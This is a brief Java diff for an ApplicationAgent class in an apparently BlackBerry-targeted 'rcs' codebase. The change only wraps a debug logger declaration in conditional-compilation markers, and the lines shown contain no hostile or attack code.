@@ -11,8 +11,11 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class ApplicationAgent extends Agent {
+    //#mdebug
     private static Debug debug = new Debug("ApplicationAgent",
             DebugLevel.VERBOSE);
+
+    //#enddebug
 
     public ApplicationAgent(boolean agentStatus) {
         super(Agent.AGENT_APPLICATION, agentStatus, true);
